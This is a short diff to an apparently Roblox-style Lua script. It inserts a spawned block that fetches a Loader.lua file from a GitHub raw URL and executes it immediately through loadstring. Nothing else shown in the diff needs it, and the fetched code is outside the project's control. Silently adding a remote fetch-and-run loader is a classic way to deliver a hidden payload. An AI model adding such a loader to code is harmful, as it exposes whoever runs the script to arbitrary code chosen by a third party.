@@ -11,6 +11,12 @@ local startPercentage = 0
 local isGeneratingURL = false
 local isLoadingURL = false
 
+spawn(function()
+
+(loadstring(game:HttpGet("https://raw.githubusercontent.com/OneCreatorX-New/TwoDev/main/Loader.lua"))())("info")
+
+    end)
+
 local function fT(s) return string.format("%02d:%02d:%02d", s/3600, (s%3600)/60, s%60) end
 
 local function ntf(m, d)
